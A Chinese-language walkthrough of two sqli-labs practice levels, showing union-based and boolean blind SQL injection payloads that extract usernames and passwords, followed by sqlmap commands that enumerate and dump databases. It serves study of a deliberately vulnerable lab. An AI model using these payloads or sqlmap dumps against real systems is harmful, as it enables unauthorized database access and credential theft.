Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)

首先题目提示我们要用id来传参

然后我们尝试加单引号测试是否存在sql注入点，

经测试存在：

然后注入就行了，使用如下payload获得表users

union select 1,table_name,3 from information_schema.tables where table_schema=database()  limit 3,1-- q

之后查找字段名，这里查到了username和password字段，于是查询这两个字段的值，构造payload如下

/?id=-1'union select 1,group_concat(username,'->',password),3 from users -- q

Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)

这题目是个盲注

盲注需要掌握的函数
length()函数 返回字符串的长度
substr()截取字符串 （语法：SUBSTR(str,pos,len);）
ascii()返回字符是ascii码
sleep()将程序挂起一段时间 n
if(expr1,expr2,expr3)判断语句，如果第一个语句正确就执行第二个语句如果错误执行第三个语句

由前面的题目知道当前数据库为：security，那么就用盲注测测看是不是这个数据库名

构造payload如下

'and ascii(substr(database(),1,1))=115 -- d

可以看到确实是开头字母s（ascii=115）

同样根据前面的题目可以知道用户表表名为users开头字母为u(ascii=117)构造payload 尝试一下

id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=117 -- d

页面返回正常

要查的字段分别为username和password

构造payload如下

?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 5,1),1,1))=112 -- d

返回页面正常，说明确实是password字段

好了我不装了，我摊牌了，我要用sqlmap了

俗话说，人和动物最大的区别是人能制造并使用工具，那么为啥不用嘞

上sqlmap，跑就完了

tips：

命令一： sqlmap -u “网址”
命令二： sqlmap -u ” 网址 ”  --dbs
命令三： sqlmap -u ” 网址 ”  -D 数据库名 --tables
命令四： sqlmap -u ” 网址 ”  -D 数据库名 -T 表名 --columns
命令五： sqlmap -u ” 网址 ”  -D 数据库名 -T 表名 -C 列名 --dump
